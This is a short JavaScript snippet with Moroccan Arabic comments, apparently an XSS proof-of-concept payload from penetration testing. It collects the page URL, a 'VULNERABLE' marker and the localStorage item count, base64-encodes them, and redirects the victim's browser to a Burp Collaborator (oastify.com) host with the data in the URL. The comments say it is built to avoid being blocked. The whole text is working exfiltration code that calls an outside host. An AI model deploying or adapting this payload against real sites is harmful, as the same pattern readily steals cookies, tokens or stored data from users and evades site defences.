// كود كيسحب داتا بسيطة ومضمونة باش نتفاداو الـ Block
var d = {
    u: window.location.href,
    s: "VULNERABLE",
    l: localStorage.length // غير شحال من حاجة كاين فـ LocalStorage باش نبينو الوصول
};
var encoded = btoa(JSON.stringify(d));
// هادي غاتحول الصفحة لـ Collaborator ومعاها الداتا فـ الرابط
window.location.replace("https://vvuzmzfyyl575ik5pbangyvfg6mxaqyf.oastify.com/?leak=" + encoded);
